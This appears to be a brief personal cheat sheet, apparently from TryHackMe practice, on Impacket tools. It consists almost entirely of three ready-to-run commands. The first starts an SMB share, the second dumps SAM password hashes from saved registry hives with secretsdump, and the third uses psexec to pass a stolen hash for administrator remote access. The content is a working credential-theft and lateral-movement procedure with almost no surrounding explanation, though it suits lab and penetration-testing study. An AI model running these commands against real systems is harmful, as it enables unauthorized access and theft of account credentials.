# Using Impacket

tags: #impacket #smb #smbserver #secretsdump #psexec #passthehash

Use impacket to create a file share on linux for temporary use on parrot linux
```bash
impacket-smbserver -smb2support -username THMBackup -password CopyMaster555 public share
```

Use impacket secretsdump to dump the SAM hashes from the system.hive and the registry.hive

```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

Use impacket psexec to pass the hash gathered for remote access
```bash
impacket-psexec -hashes <hash for the account with the colon seperating them> administrator@<ip address>
```